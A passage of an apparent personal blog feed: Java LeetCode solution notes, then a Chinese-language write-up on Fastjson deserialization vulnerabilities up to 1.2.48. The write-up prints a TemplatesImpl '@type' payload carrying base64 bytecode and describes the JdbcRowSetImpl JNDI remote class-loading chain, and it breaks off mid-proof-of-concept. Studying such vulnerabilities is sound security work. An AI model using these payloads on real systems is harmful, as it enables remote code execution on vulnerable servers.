class="number">3.</span>注意，不能用arrs[i]==<span class="string">&quot;null&quot;</span>去比较字符串，因为arrs[i]是split分割字符串得到的，应该是调用了<span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;xxx&quot;</span>)，这是新的对象，比较结果必然是<span class="literal">false</span>，应该用equals比较字符串内容。</span><br></pre></td></tr></table></figure><h2 id="48、最长不含重复字符的子字符串（3、1月1日）"><a href="#48、最长不含重复字符的子字符串（3、1月1日）" class="headerlink" title="48、最长不含重复字符的子字符串（3、1月1日）"></a>48、最长不含重复字符的子字符串（3、1月1日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，滑动窗口+hashMap。从左到右遍历字符串，当满足“hashMap中不包含该字符或者该字符的重复位置小于滑动窗口left”时，就更新result；当不满足时，说明该字符重复，且重复位置大于left，需要更新left，每轮遍历将&lt;字符，新位置i&gt;的映射放入hashMap。</span><br></pre></td></tr></table></figure><h2 id="49、丑数（264、1月1日）"><a href="#49、丑数（264、1月1日）" class="headerlink" title="49、丑数（264、1月1日）"></a>49、丑数（264、1月1日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>思路<span class="number">1</span>，优先队列+hashSet去重。这道题仔细看题解，质因子只有&#123;<span class="number">2</span>，<span class="number">3</span>，<span class="number">5</span>&#125;，并不包含其他质数。Java中默认优先队列为最小堆，这时候可以往优先队列pq中放入<span class="number">2</span>、<span class="number">3</span>、<span class="number">5</span>，此时<span class="number">2</span>为最小元素先出堆，用<span class="number">2</span>再去依次乘&#123;<span class="number">2</span>，<span class="number">3</span>，<span class="number">5</span>&#125;，把新的结果再放入堆中。这样做，每次出堆的小数字成为新的因子，去乘&#123;<span class="number">2</span>，<span class="number">3</span>，<span class="number">5</span>&#125;，得到入堆的新数字。只要注意，放入堆前用hashSet去重，避免某个数字是&#123;<span class="number">2</span>，<span class="number">3</span>，<span class="number">5</span>&#125;的公倍数。</span><br></pre></td></tr></table></figure><h2 id="50、第一个只出现一次的字符（1月1日）"><a href="#50、第一个只出现一次的字符（1月1日）" class="headerlink" title="50、第一个只出现一次的字符（1月1日）"></a>50、第一个只出现一次的字符（1月1日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，穷举。因为都是小写字母，维护<span class="type">int</span>型数组counts统计<span class="number">26</span>个字母词频。先从左到右遍历s，统计字母词频；再从左到右遍历s，取出第一个词频为<span class="number">1</span>的字母。只要记住ascii和<span class="type">char</span>相互转换咋写即可。</span><br><span class="line"><span class="number">2.</span><span class="type">char</span>型字母和<span class="type">int</span>型ascii相互转换：</span><br><span class="line"><span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> s.charAt(i)-<span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">(<span class="type">char</span>) (<span class="number">97</span>+positions[i]);</span><br></pre></td></tr></table></figure><h2 id="60、n个骰子的点数（1月1日）"><a href="#60、n个骰子的点数（1月1日）" class="headerlink" title="*60、n个骰子的点数（1月1日）"></a>*60、n个骰子的点数（1月1日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>思路<span class="number">1</span>，动态规划。这道题怎么看都需要背下来，现在看完全不懂。第（i-<span class="number">1</span>）个骰子点数之和数组的第j个值，它影响第i个骰子的tmp[j+k]个值。每轮结束将新的tmp数组赋值给dp。</span><br></pre></td></tr></table></figure><h2 id="52、两个链表的第一个公共节点（160、1月2日）"><a href="#52、两个链表的第一个公共节点（160、1月2日）" class="headerlink" title="52、两个链表的第一个公共节点（160、1月2日）"></a>52、两个链表的第一个公共节点（160、1月2日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，hashSet。首先遍历headA链表，将节点都放在hashSet；再遍历headB链表，遇到第一个已经在hashSet存在的节点，即为第一个公共节点。</span><br><span class="line"><span class="number">2.</span>思路<span class="number">1</span>，双指针。假设链表长度headA=a+c，链表长度headB=b+c，如果两个链表同步更新，必然有a+c+b=b+c+a，同时到达公共节点。实现就是，遍历headA到<span class="literal">null</span>时，下一位指向headB。</span><br></pre></td></tr></table></figure><h2 id="53、在排序数组中查找数字Ⅰ（34、1月2日）"><a href="#53、在排序数组中查找数字Ⅰ（34、1月2日）" class="headerlink" title="53、在排序数组中查找数字Ⅰ（34、1月2日）"></a>53、在排序数组中查找数字Ⅰ（34、1月2日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，二分查找。先通过二分查找，找到等于target的目标位置，再向下或向上确定其他等于target的目标位置，统计次数。注意，向下确定时需满足i&gt;=<span class="number">0</span>，向上确定时需满足i&lt;=nums.length-<span class="number">1</span>。</span><br></pre></td></tr></table></figure><h2 id="53-Ⅱ、0-n-1中缺失的数字（1月2日）"><a href="#53-Ⅱ、0-n-1中缺失的数字（1月2日）" class="headerlink" title="53-Ⅱ、0~n-1中缺失的数字（1月2日）"></a>53-Ⅱ、0~n-1中缺失的数字（1月2日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，直接遍历。从左往右遍历，不满足nums[i]==i即返回，都满足则返回nums.length。</span><br><span class="line"><span class="number">2.</span>思路<span class="number">1</span>，二分查找。有序数组中的搜索问题，首先想到二分法解决。左右数组不同点在于，左边数组nums[i]==i，右边数组nums[i]!=i，题目转换为，通过二分查找找到第一个nums[i]!=i的数字。</span><br><span class="line">注意临界条件是left&lt;=right，因为每次都是移动<span class="number">1</span>位，必然有left==right。当left==right时，如果nums[mid]!=mid，移动right指针，此时left指针仍指向第一个不满足的数字；如果nums[mid]==mid，移动left指针一位，就指向了第一个不满足的数字。在这种临界条件下，结果返回left就好。</span><br></pre></td></tr></table></figure><h2 id="54、二叉搜索树的第k大节点（1月2日）"><a href="#54、二叉搜索树的第k大节点（1月2日）" class="headerlink" title="54、二叉搜索树的第k大节点（1月2日）"></a>54、二叉搜索树的第k大节点（1月2日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，按右中左顺序遍历二叉树。但是，如何传递k成了难事，k并不是随深度递增，而是到最底层后，回归时不断减小。这种时候，除非在dfs返回值中返回k，更优雅的解法是使用全局变量。dfs访问自身root节点时，就将k减少<span class="number">1</span>位，如果k减少为<span class="number">0</span>，就将res赋值为root.val。每次先访问完root.right后，如果k已经为<span class="number">0</span>，就直接返回，不再访问root和root.left。</span><br></pre></td></tr></table></figure><h2 id="55-Ⅰ、二叉树的深度（104、1月2日）"><a href="#55-Ⅰ、二叉树的深度（104、1月2日）" class="headerlink" title="55-Ⅰ、二叉树的深度（104、1月2日）"></a>55-Ⅰ、二叉树的深度（104、1月2日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，队列实现层序遍历二叉树。注意，还是判断tmp.left!=<span class="literal">null</span>，tmp.right!=<span class="literal">null</span>后，将不为<span class="literal">null</span>的节点放入deque，逻辑更清除一些。</span><br></pre></td></tr></table></figure><h2 id="55-Ⅱ、平衡二叉树（110、1月3日）"><a href="#55-Ⅱ、平衡二叉树（110、1月3日）" class="headerlink" title="55-Ⅱ、平衡二叉树（110、1月3日）"></a>55-Ⅱ、平衡二叉树（110、1月3日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>思路<span class="number">1</span>，自顶向下递归。对于每个节点root，通过辅助函数height()求其left、right子树的高度，需满足两子树高度差小于等于<span class="number">1</span>，同时需递归调用isBalanced判断left、right子树是否满足平衡。（关键词，两个递归）</span><br><span class="line">Math.max(height(root.left), height(root.right)) + <span class="number">1</span>;   <span class="comment">//height核心逻辑，也是通过递归累积高度</span></span><br><span class="line"><span class="number">2.</span>思路<span class="number">2</span>，自底向上的递归。在上面的方法中，显然height在被重复调用，求root节点时height(root.left)会递归到height(root.left.left)，求root.left是否平衡时，也会调用height(root.left.left)，这种重复非常普遍。本质是，前面方法为先序遍历，先判断root是否平衡，再判断左右子树，理想解法是后序遍历，题解巧妙在设置标志位为-<span class="number">1</span>。</span><br></pre></td></tr></table></figure><h2 id="56-Ⅰ、数组中数字出现的次数（1月4日）"><a href="#56-Ⅰ、数组中数字出现的次数（1月4日）" class="headerlink" title="*56-Ⅰ、数组中数字出现的次数（1月4日）"></a>*56-Ⅰ、数组中数字出现的次数（1月4日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，hashMap。先遍历nums将数字和次数放入hashMap，再遍历hashMap取出次数为<span class="number">1</span>的数字。</span><br><span class="line"><span class="number">2.</span>如果找出一堆数字中唯一的只出现<span class="number">1</span>次的数字，则将全部数字进行异或就能得到。</span><br></pre></td></tr></table></figure><h2 id="63、股票的最大利润（121、1月5日）"><a href="#63、股票的最大利润（121、1月5日）" class="headerlink" title="63、股票的最大利润（121、1月5日）"></a>63、股票的最大利润（121、1月5日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，穷举法。从左到右遍历prices，从<span class="number">0</span>到当前位置前一位获取历史价格，取差价的最大值。</span><br><span class="line"><span class="number">2.</span>思路<span class="number">1</span>，动态规划。设置dp[i]表示第i天以前能赚到的最大值，维护minValue表示最低价格。从左到右遍历时，状态转移方程如下，用prices[i]更新minValue。</span><br><span class="line">    dp[i] = Math.max(dp[i-<span class="number">1</span>],prices[i]-minValue);</span><br></pre></td></tr></table></figure><h2 id="64、求1-2-…-n（1月6日）"><a href="#64、求1-2-…-n（1月6日）" class="headerlink" title="64、求1+2+…+n（1月6日）"></a>64、求1+2+…+n（1月6日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>这道题不能用等差数列、<span class="keyword">for</span>、<span class="keyword">while</span>、<span class="keyword">if</span>、<span class="keyword">else</span>等逻辑判断。</span><br><span class="line"><span class="number">2.</span>思路<span class="number">1</span>，递归。递归的终止条件是，当n减小到<span class="number">0</span>时，直接<span class="keyword">return</span> <span class="number">0</span>，否则<span class="keyword">return</span> n+sumNums(n-<span class="number">1</span>)。但是题目不允许<span class="keyword">if</span>，题解用了更巧妙地实现表示该逻辑：</span><br><span class="line"><span class="type">boolean</span> <span class="variable">flag</span> <span class="operator">=</span> n &gt; <span class="number">0</span> &amp;&amp; (n += sumNums(n - <span class="number">1</span>)) &gt; <span class="number">0</span>;  <span class="comment">//后面的&gt;0没有意义，只因返回boolean</span></span><br></pre></td></tr></table></figure><h2 id="57、和为s的两个数字（1月6日）"><a href="#57、和为s的两个数字（1月6日）" class="headerlink" title="57、和为s的两个数字（1月6日）"></a>57、和为s的两个数字（1月6日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，二分查找。由于nums是递增排序的数组，所以每轮left指针指向(i+<span class="number">1</span>)，right指针指向(nums.lenght-<span class="number">1</span>)，进行二分查找。</span><br><span class="line"><span class="number">2.</span>其他解法，hashSet，双指针。</span><br></pre></td></tr></table></figure><h2 id="57-Ⅱ、和为s的连续正数序列（1月6日）"><a href="#57-Ⅱ、和为s的连续正数序列（1月6日）" class="headerlink" title="57-Ⅱ、和为s的连续正数序列（1月6日）"></a>57-Ⅱ、和为s的连续正数序列（1月6日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，双指针。从<span class="number">1</span>到target遍历right指针，如果当前sum&lt;=target，当等于时，将<span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;(result)添加到results，不管小于还是等于，都将right指针向后移动<span class="number">1</span>位，将sum加上当前right。当sum&gt;right时，通过<span class="keyword">while</span>循环删除result最开始的元素。最后将List&lt;List&lt;Integer&gt;&gt;转换为<span class="type">int</span>[][]，由于是<span class="type">int</span>不是String，不能用list.toArray(<span class="type">int</span>[])。</span><br></pre></td></tr></table></figure><h2 id="66、构建乘积数组（1月7日）"><a href="#66、构建乘积数组（1月7日）" class="headerlink" title="66、构建乘积数组（1月7日）"></a>66、构建乘积数组（1月7日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，暴力破解。两层<span class="keyword">for</span>循环，result[i]为不包含a[i]的其他元素的乘积。</span><br><span class="line"><span class="number">2.</span>思路<span class="number">1</span>，辅助数组。设L[i]表示i往左所有数字乘积之和，R[i]表示i往右所有数字乘积之和，可知L[i]=L[i-<span class="number">1</span>]*a[i-<span class="number">1</span>]。有了L[i]和R[i]辅助数组后，可知resule[i] = L[i]*R[i]，因为它俩都不包含a[i]。</span><br></pre></td></tr></table></figure><h2 id="58-Ⅰ、翻转单词顺序（151、1月7日）"><a href="#58-Ⅰ、翻转单词顺序（151、1月7日）" class="headerlink" title="58-Ⅰ、翻转单词顺序（151、1月7日）"></a>58-Ⅰ、翻转单词顺序（151、1月7日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，暴力破解。通过s.split(<span class="string">&quot; &quot;</span>)将字符串切割后，String数组存在很多<span class="string">&quot;&quot;</span>，先编写循环剔除<span class="string">&quot;&quot;</span>，再编写循环将其翻转，注意特殊处理最后的字符，其后面不需要加<span class="string">&quot;&quot;</span>。</span><br></pre></td></tr></table></figure><h2 id="58-Ⅱ、左旋转字符串（1月7日）"><a href="#58-Ⅱ、左旋转字符串（1月7日）" class="headerlink" title="58-Ⅱ、左旋转字符串（1月7日）"></a>58-Ⅱ、左旋转字符串（1月7日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，StringBuilder。通过<span class="keyword">for</span>(n-&gt;s.length)先获取后半段，再通过<span class="keyword">for</span>(<span class="number">0</span>-&gt;n)获取前半段，拼接两部分即可。</span><br></pre></td></tr></table></figure><h2 id="61、扑克牌中的顺子（1月8日）"><a href="#61、扑克牌中的顺子（1月8日）" class="headerlink" title="61、扑克牌中的顺子（1月8日）"></a>61、扑克牌中的顺子（1月8日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>思路<span class="number">1</span>，hashSet。思路比较其他，因为是<span class="number">5</span>张牌组成的顺子，除大小王外，每张牌都有固定位置，即不能有重复。此时，maxValue-minValue&lt;<span class="number">5</span>，即大小王在内部时=<span class="number">4</span>，在外部时=<span class="number">3</span>。实现该思路，就是hashSet不重复的前提下，不断更新maxValue和minValue。</span><br></pre></td></tr></table></figure><h2 id="62、圆圈中最后剩下的数字（1月8日）"><a href="#62、圆圈中最后剩下的数字（1月8日）" class="headerlink" title="*62、圆圈中最后剩下的数字（1月8日）"></a>*62、圆圈中最后剩下的数字（1月8日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>思路<span class="number">1</span>，迭代法。这道题没啥说的，就是公式推导：f(n,m) = (f(n-<span class="number">1.</span>m)+m)%n;</span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">lastRemaining</span><span class="params">(<span class="type">int</span> n, <span class="type">int</span> m)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">f</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">2</span>; i != n + <span class="number">1</span>; ++i) &#123;</span><br><span class="line">        f = (m + f) % i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> f;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="68-Ⅰ、二叉搜索树的最近公共祖先（235、1月9日）"><a href="#68-Ⅰ、二叉搜索树的最近公共祖先（235、1月9日）" class="headerlink" title="68-Ⅰ、二叉搜索树的最近公共祖先（235、1月9日）"></a>68-Ⅰ、二叉搜索树的最近公共祖先（235、1月9日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>思路<span class="number">1</span>，两次遍历。对TreeNode节点p和q计算路径，再通过同步遍历pathP和pathQ，找到最后一个不相同的节点，即为最近祖先。</span><br></pre></td></tr></table></figure><h2 id="68-Ⅱ、二叉树的最近公共祖先（236、1月9日）"><a href="#68-Ⅱ、二叉树的最近公共祖先（236、1月9日）" class="headerlink" title="68-Ⅱ、二叉树的最近公共祖先（236、1月9日）"></a>68-Ⅱ、二叉树的最近公共祖先（236、1月9日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，深度优先搜索。这道题和搜索树不同的点，在于对TreeNode节点p和q计算路径的思路，搜索树有明确的方向，普通二叉树需要通过dfs找到目标路径。这里我维护了<span class="type">boolean</span>[]变量flag，当找到目标节点时，将flag置为<span class="literal">true</span>，回溯时根据该flag标志位，不再进入其他路径，也不再删除本路径的节点。</span><br></pre></td></tr></table></figure><h2 id="65、不用加减乘除做加法（1月10日）"><a href="#65、不用加减乘除做加法（1月10日）" class="headerlink" title="*65、不用加减乘除做加法（1月10日）"></a>*65、不用加减乘除做加法（1月10日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>表示a与b求和后，本位的变化为：a异或b；表示a与b求和后，进位的变化为：(a&amp;b)&lt;&lt;<span class="number">1</span>。</span><br><span class="line"><span class="number">2.</span>思路<span class="number">1</span>，模拟加法。将整数a和b的求和，拆分为a和b的无进位加法结果和进位结果的和。carry为啥这样就表示进位，俺也不懂。。。。。。</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> &#123;</span><br><span class="line">        <span class="keyword">while</span> (b != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">carry</span> <span class="operator">=</span> (a &amp; b) &lt;&lt; <span class="number">1</span>;</span><br><span class="line">            a = a ^ b;</span><br><span class="line">            b = carry;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> a;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="2283、判断一个数字的数字计数是否等于数位的值（1月11日）"><a href="#2283、判断一个数字的数字计数是否等于数位的值（1月11日）" class="headerlink" title="2283、判断一个数字的数字计数是否等于数位的值（1月11日）"></a>2283、判断一个数字的数字计数是否等于数位的值（1月11日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，hashMap。遍历两次，第一次用hashMap统计词频，第二次比较hashMap和输入数组。</span><br><span class="line"><span class="number">2.</span>获取“<span class="number">1210</span>”中每个数字不能是简单的num.charAt(i)，那样<span class="number">0</span>会变成<span class="number">48</span>，有两种方式正确计算：</span><br><span class="line">a.<span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> Integer.parseInt(String.valueOf(num.charAt(i)));</span><br><span class="line">b.<span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> num.charAt(i) - <span class="string">&#x27;0&#x27;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> LeetCode </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Fastjson before 1.2.48</title>
      <link href="/2023/03/20/Fastjson-before-1-2-48/"/>
      <url>/2023/03/20/Fastjson-before-1-2-48/</url>
      
        <content type="html"><![CDATA[<h2 id="Fastjson"><a href="#Fastjson" class="headerlink" title="Fastjson"></a>Fastjson</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://www.cnpanda.net/sec/1183.html</span><br><span class="line">https://y4er.com/posts/fastjson-1.2.80/</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>​fastjson是阿里巴巴开源的一个JSON解析库，主要功能是，将Java Bean序列化成JSON字符串，将JSON字符串反序列化成Java对象，但是，fastjson在序列化以及反序列化的过程中并没有使用Java自带的序列化机制，而是自定义了一套机制。其在序列化过程中，是遍历出该类中的所有getter方法，获取到字段值，序列化到JSON字符串中。</p><h2 id="依赖"><a href="#依赖" class="headerlink" title="依赖"></a>依赖</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;com.alibaba&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;fastjson&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">1.2</span><span class="number">.24</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><h2 id="运行原理"><a href="#运行原理" class="headerlink" title="运行原理"></a>运行原理</h2><h3 id="Autotype"><a href="#Autotype" class="headerlink" title="Autotype"></a>Autotype</h3><blockquote><p>​Autotype机制，就是序列化JSON字符串时，JSON.toJSONString携带参数SerializerFeature.WriteClassName，得到的JSON字符串携带@type属性，属性值为具体类名，当解析该字符串时，能根据具体类名恢复出Java对象。</p></blockquote><p>​我们一般这样使用fastjson，其中Apple类实现了Fruit接口。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Apple</span> <span class="variable">apple</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Apple</span>();</span><br><span class="line">apple.setPrice(<span class="number">1</span>);</span><br><span class="line"><span class="comment">//序列化s1为&#123;&quot;price&quot;:1&#125;</span></span><br><span class="line"><span class="type">String</span> <span class="variable">s1</span> <span class="operator">=</span> JSON.toJSONString(apple);</span><br><span class="line"><span class="comment">//反序列化 </span></span><br><span class="line"><span class="type">Apple</span> <span class="variable">o1</span> <span class="operator">=</span> JSON.parseObject(s1,Apple.class);</span><br></pre></td></tr></table></figure><p>​但是我们需要降耦合，假如服务端恢复JSON对象时，考虑到多态，使用了Fruit接口，parseObject方法返回的对象是代理类，不能通过向下转型恢复成实现类Apple类。（这里称客户端是JSON对象转字符串，服务端是字符串转JSON对象）</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Fruit</span> <span class="variable">o1</span> <span class="operator">=</span> JSON.parseObject(s1,Fruit.class);</span><br><span class="line"><span class="comment">//向下转型，会报错：ClassCastException: com.sun.proxy.$Proxy0 cannot be cast to com.bmsk.Fastjson.model.Apple</span></span><br><span class="line"><span class="type">Apple</span> <span class="variable">o2</span> <span class="operator">=</span> (Apple) o1;  <span class="comment">//向下转型</span></span><br></pre></td></tr></table></figure><p>​解决这个问题的思路很明确，就是JSON字符串传递具体的类名，这需要在客户端带上SerializerFeature.WriteClassName参数，序列化结果如下，这时候就能向下转型成具体的Apple类。可以看到序列化字符串是不同的，带上了@type属性。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//序列化s1为&#123;&quot;@type&quot;:&quot;com.bmsk.Fastjson.model.Apple&quot;,&quot;price&quot;:1&#125;</span></span><br><span class="line"><span class="type">String</span> <span class="variable">s1</span> <span class="operator">=</span> JSON.toJSONString(apple,SerializerFeature.WriteClassName);</span><br><span class="line"><span class="type">Fruit</span> <span class="variable">o1</span> <span class="operator">=</span> JSON.parseObject(s1,Fruit.class);</span><br><span class="line"><span class="comment">//输出com.bmsk.Fastjson.model.Apple</span></span><br><span class="line">System.out.println(o1.getClass().getName());</span><br></pre></td></tr></table></figure><p>​继续降耦合，parseObject方法的参数从具体类.class，到抽象类.class或者接口.class，再到不需要任何信息，能做到吗json兄？当parseObject方法不指定class时返回的是JSONObject，感觉没啥用。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//做不到，不指定class没啥用，哪怕序列化时带参数SerializerFeature.WriteClassName也不行</span></span><br><span class="line"><span class="type">JSONObject</span> <span class="variable">o1</span> <span class="operator">=</span> JSON.parseObject(s1);</span><br><span class="line"><span class="comment">//做得到，需要参数SerializerFeature.WriteClassName</span></span><br><span class="line"><span class="type">Apple</span> <span class="variable">o1</span> <span class="operator">=</span> JSON.parse(s1);</span><br></pre></td></tr></table></figure><p>​其实parseObject方法的逻辑，当只接受JSON字符串参数时，底层还是parse方法，只是多了一步调用toJSON(obj)，会调用该对象的getter方法，但感觉反序列化时调getter读没啥用；当接受指定类参数时，会找到该类对应的<strong>反序列化器</strong>，执行反序列化。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//参数为 JSON字符串</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> JSONObject <span class="title function_">parseObject</span><span class="params">(String text)</span> &#123;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> parse(text);</span><br><span class="line">    <span class="keyword">return</span> obj <span class="keyword">instanceof</span> JSONObject ? (JSONObject)obj : (JSONObject)toJSON(obj);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//参数为 JSON字符串，具体类.class</span></span><br><span class="line">derializer.deserialze(<span class="built_in">this</span>, type, fieldName);</span><br></pre></td></tr></table></figure><p>​总结一下，感觉fastjson就是Java Bean的序列化机制，它是序列化，不加载类，所以需要至少一端指定class。</p><ul><li>服务端parseObject解析序列化的字符串时，需要指定class，指定具体class就能恢复出具体类，但指定的是抽象类class或者接口class时，需要客户端JSON.toJSONString传入SerializerFeature.WriteClassName参数。</li><li>服务端parse解析序列化的字符串时，不需要指定class，但需要客户端JSON.toJSONString传入SerializerFeature.WriteClassName参数。</li><li>如果客户端不带SerializerFeature.WriteClassName参数，服务端也没指定class，耶稣来了也救不了，统一是JSONObject，失去了作用。只有得到类名，才能找到fastjson中对应的反序列化器，恢复出Java对象。</li></ul><h3 id="自动方法调用的范围"><a href="#自动方法调用的范围" class="headerlink" title="自动方法调用的范围"></a>自动方法调用的范围</h3><p>先说结论，</p><blockquote><p>1.parse(jsonStr)</p><p>​构造方法+Json字符串指定属性的setter()+特殊的getter()</p><p>2.parseObject(jsonStr)</p><p>​构造方法+Json字符串指定属性的setter()+**所有getter() 包括不存在属性和私有属性的getter()**（因为toJSON会出手）</p><p>3.parseObject(jsonStr,Object.class)</p><p>​构造方法+Json字符串指定属性的setter()+特殊的getter()</p></blockquote><p>​在通过@type拿到类之后，通过反射拿到该类所有的方法存入methods，接下来遍历methods进而获取get、set方法，对满足条件的方法（且JSON字符串存在对应的属性）进行调用。在com.alibaba.fastjson.util.JavaBeanInfo#build中，<strong>set方法的自动调用条件</strong>为：</p><ol><li>方法名长度大于4</li><li>非静态方法</li><li>返回值为void或当前类</li><li>方法名以set开头</li><li>参数个数为1</li></ol><p>​<strong>get方的自动调用条件</strong>为：</p><ol><li>方法名长度大于等于4</li><li>非静态方法</li><li>以get开头且第4个字母为大写</li><li>无传入参数</li><li>返回值类型继承自Collection Map AtomicBoolean AtomicInteger AtomicLong</li></ol><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><h3 id="1-2-22-1-2-24版本"><a href="#1-2-22-1-2-24版本" class="headerlink" title="1.2.22-1.2.24版本"></a>1.2.22-1.2.24版本</h3><p>​在小于fastjson1.2.22-1.2.24版本中有两条利用链，JdbcRowSetImpl链和TemplatesImpl链。</p><h4 id="TemplatesImpl链"><a href="#TemplatesImpl链" class="headerlink" title="TemplatesImpl链"></a>TemplatesImpl链</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">NASTY_CLASS</span> <span class="operator">=</span> <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">text1</span> <span class="operator">=</span> <span class="string">&quot;&#123;&quot;</span>+</span><br><span class="line">    <span class="string">&quot;\&quot;@type\&quot;:\&quot;&quot;</span> + NASTY_CLASS +<span class="string">&quot;\&quot;,&quot;</span>+</span><br><span class="line">    <span class="string">&quot;\&quot;_bytecodes\&quot;:[\&quot;&quot;</span>+evilCode_base64+<span class="string">&quot;\&quot;],&quot;</span>+</span><br><span class="line">    <span class="string">&quot;&#x27;_name&#x27;:&#x27;a.b&#x27;,&quot;</span>+</span><br><span class="line">    <span class="string">&quot;&#x27;_tfactory&#x27;:&#123; &#125;,&quot;</span>+</span><br><span class="line">    <span class="string">&quot;&#x27;_outputProperties&#x27;:&#123; &#125;&quot;</span>+</span><br><span class="line">    <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> JSON.parseObject(text1,Object.class, Feature.SupportNonPublicField);</span><br></pre></td></tr></table></figure><p>​调试CC链时，比较熟悉TemplatesImpl类了，该类的newTransformer方法（最底层是getTransletInstance方法）会加载_bytecodes属性上的字节码并实例化。TemplatesImpl的getOutputProperties方法会调用newTransformer。注意，先对bytecodes属性进行base64解码，这是Fastjson的逻辑，不是TemplatesImpl类的逻辑，因为Fastjson传递的是JSON字符串，不是原生反序列化的字节序列。</p><p>​“_outputProperties”参数前的”_“字符可以在fastjson解析过程中自动删除。</p><p>​漏洞原理也比较简单，反序列化TemplatesImpl类时，自动调用getOutputProperties方法，加载_bytecodes属性上的恶意代码。但是，Fastjson解析端开启<strong>Feature.SupportNonPublicField</strong>后，才能对非共有属性的反序列化处理。</p><h4 id="JdbcRowSetImpl链"><a href="#JdbcRowSetImpl链" class="headerlink" title="JdbcRowSetImpl链"></a>JdbcRowSetImpl链</h4><p>​JdbcRowSetImpl链的原理也很简单，就是当调用setAutoCommit方法时，内部会进行JNDI查询，就存在JNDI+RMI Reference、JNDI+LDAP远程类加载的攻击点。但我尝试如下代码，构造JdbcRowSetImpl字符串时，toJSONString出现了报错，所有，有时候我会觉得fastjson也太过灵活，根本不是啥序列化，而是给了类名和属性值字符串，就可劲儿调用对象的setter和getter方法。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">PoC</span> <span 